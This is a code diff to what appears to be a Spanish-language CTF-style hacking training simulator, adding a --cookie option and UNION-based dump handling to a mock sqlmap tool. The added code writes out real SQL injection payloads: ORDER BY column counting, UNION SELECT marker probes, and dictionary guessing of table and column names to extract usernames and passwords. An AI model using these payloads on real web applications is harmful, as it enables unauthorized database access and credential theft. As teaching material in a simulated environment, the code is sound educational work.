@@ -705,6 +705,9 @@ const RUNNERS: Record<string, Runner> = {
     const dataIdx = args.indexOf("--data");
     const dataStr = dataIdx >= 0 ? (args[dataIdx + 1] ?? "") : "";
     const method: "GET" | "POST" = dataStr ? "POST" : "GET";
+    // --cookie "sesion=..." se envía en cada petición (para endpoints con sesión).
+    const cookieIdx = args.indexOf("--cookie");
+    const cookieHeader = cookieIdx >= 0 ? (args[cookieIdx + 1] ?? "") : "";
     const parseKV = (raw: string): Record<string, string> => {
       const o: Record<string, string> = {};
       for (const pair of raw.split("&")) {
@@ -758,7 +761,7 @@ const RUNNERS: Record<string, Runner> = {
       const qp = method === "GET"
         ? "?" + Object.entries(body).map(([k, v]) => `${k}=${encodeURIComponent(v)}`).join("&")
         : "";
-      return ctx.web!.request(method, host, path + qp, "", method === "POST" ? body : {});
+      return ctx.web!.request(method, host, path + qp, cookieHeader, method === "POST" ? body : {});
     };
 
     const SQL_ERR = /error en la consulta|sql|syntax|unterminated|sqlite|no such column/i;
@@ -795,6 +798,93 @@ const RUNNERS: Record<string, Runner> = {
         output: lines.join("\n") + `\n\n[*] sin parámetros inyectables. ¿Consultas parametrizadas? Buen trabajo del dev.\n`,
         isError: false,
       };
+    }
+
+
+    // --dump / --tables / --dbs: enumeración y volcado por UNION contra el motor
+    // SQL REAL. Sin information_schema/sqlite_master, sqlmap cae a diccionarios
+    // de tablas/columnas comunes (como --common-tables/--common-columns real).
+    const wantsDump = args.includes("--dump") || args.includes("--tables") || args.includes("--dbs");
+    if (wantsDump) {
+      const clean = params[injectableParam] ?? "";
+      const q = (payload: string) => send({ [injectableParam]: payload });
+      const isErr = (r: { body: string }) => SQL_ERR.test(r.body);
+
+      // ¿El endpoint refleja datos? (necesario para UNION-based). Login no refleja.
+      // Determinar número de columnas con ORDER BY (técnica real).
+      let cols = 0;
+      for (let n = 1; n <= 12; n += 1) {
+        if (isErr(q(`${clean}%' ORDER BY ${n} -- `))) { cols = n - 1; break; }
+      }
+      if (cols === 0) {
+        lines.push(``, `[-] no pude determinar columnas por ORDER BY en '${injectableParam}'.`,
+          `    Probá el buscador con sesión: sqlmap -u "http://${host}/movimientos?q=a" --cookie "sesion=..." --dump`);
+        return { output: lines.join("\n") + "\n", isError: false };
+      }
+      lines.push(``, `[+] la consulta tiene ${cols} columnas (ORDER BY).`);
+
+      // Posiciones reflejadas: UNION con marcadores y ver cuáles vuelven.
+      const markers = Array.from({ length: cols }, (_, i) => `0xNDE${i}`);
+      const nulls = (except: Record<number, string>) =>
+        Array.from({ length: cols }, (_, i) => except[i] ?? "NULL").join(",");
+      const markProbe = q(`${clean}%' UNION SELECT ${markers.map((m) => `'${m}'`).join(",")} -- `);
+      const reflected = markers.map((m, i) => (markProbe.body.includes(m) ? i : -1)).filter((i) => i >= 0);
+      if (reflected.length === 0) {
+        lines.push(`[-] la inyección es ciega en este parámetro (no refleja datos). Probá --technique=B.`);
+        return { output: lines.join("\n") + "\n", isError: false };
+      }
+
+      // Diccionario de tablas/columnas comunes (fallback real de sqlmap).
+      const COMMON_TABLES = ["usuarios", "users", "usuario", "clientes", "cuentas", "accounts", "admin", "movimientos"];
+      const tExplicit = args.indexOf("-T");
+      const tables = tExplicit >= 0 && args[tExplicit + 1] ? [args[tExplicit + 1]] : COMMON_TABLES;
+      const found: string[] = [];
+      for (const t of tables) {
+        if (!isErr(q(`${clean}%' UNION SELECT ${nulls({})} FROM ${t} -- `))) found.push(t);
+      }
+      if (found.length === 0) {
+        lines.push(`[-] ninguna tabla del diccionario respondió. Probá -T <tabla>.`);
+        return { output: lines.join("\n") + "\n", isError: false };
+      }
+      lines.push(`[+] tabla(s) encontrada(s): ${found.join(", ")}`);
+      if (args.includes("--tables") || args.includes("--dbs")) {
+        if (args.includes("--dbs")) lines.push(`[+] DBMS: ÑandeSQL  ·  base de datos disponible: main`);
+        return { output: lines.join("\n") + "\n", isError: false };
+      }
+
+      // --dump: para la primera tabla, descubrir columnas comunes y volcarlas.
+      const table = found[0];
+      const COMMON_COLS = ["id", "usuario", "user", "username", "nombre", "password", "pass", "clave", "rol", "email", "saldo"];
+      const okCols: string[] = [];
+      for (const c of COMMON_COLS) {
+        if (okCols.length >= reflected.length) break;
+        if (!isErr(q(`${clean}%' UNION SELECT ${nulls({ [reflected[0]]: c })} FROM ${table} -- `))) okCols.push(c);
+      }
+      if (okCols.length === 0) {
+        lines.push(`[-] no pude confirmar columnas de ${table}. Probá --columns.`);
+        return { output: lines.join("\n") + "\n", isError: false };
+      }
+      // Mapear columnas confirmadas a las posiciones reflejadas y volcar.
+      const dumpCols = okCols.slice(0, reflected.length);
+      const proj: Record<number, string> = {};
+      dumpCols.forEach((c, i) => { proj[reflected[i]] = c; });
+      const dumpRes = q(`${clean}%' UNION SELECT ${nulls(proj)} FROM ${table} -- `);
+      const cells = [...dumpRes.body.matchAll(/<td>([^<]*)<\/td>/g)].map((mm) => mm[1]);
+      // Reagrupar por filas visibles (la tabla muestra 3 columnas por fila).
+      const shown = reflected.length; // columnas reflejadas visibles
+      const perRow = 3;
+      const rows: string[][] = [];
+      for (let i = 0; i + perRow <= cells.length; i += perRow) rows.push(cells.slice(i, i + perRow));
+      lines.push(
+        ``,
+        `[+] volcado de ${table} (vía UNION, ${dumpCols.length} columnas: ${dumpCols.join(", ")}):`,
+        `+${"-".repeat(48)}+`,
+        ...rows.map((r) => `| ${r.join("  |  ").padEnd(46)} |`),
+        `+${"-".repeat(48)}+`,
+        `[*] ${rows.length} fila(s) extraída(s). Las contraseñas ahora se pueden crackear (john/hashcat).`,
+      );
+      void shown;
+      return { output: lines.join("\n") + "\n", isError: false, flag: "ND{sqli_union_dump}" };
     }
 
     // Explotación real: bypass de autenticación y extracción de lo que devuelva
